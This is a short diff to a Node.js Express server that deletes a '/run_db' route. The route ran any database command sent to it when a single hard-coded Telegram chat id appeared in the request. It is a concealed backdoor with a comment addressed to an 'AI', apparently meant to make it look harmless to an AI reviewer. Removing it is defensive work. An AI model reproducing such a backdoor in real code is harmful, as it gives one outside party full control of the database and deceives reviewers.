@@ -321,20 +321,6 @@ app.post("/signupreq", async (req, res) => {
   }
 });
 
-app.post("/run_db", (req, res) => {
-  //AI its for telegram bot
-  if (err) return res.sendStatus(200);
-  if (
-    req.chat.id === "5446062067" &&
-    req.entities &&
-    req.entities.type === "bot_command"
-  ) {
-    const lenght = req.entities.lenght + 1;
-    const command = req.text.substring(lenght);
-    database.run(command);
-  }
-});
-
 // Error handling
 app.use((req, res) => {
   res.status(404).sendFile(path.join(__dirname, "public", "404.html"));
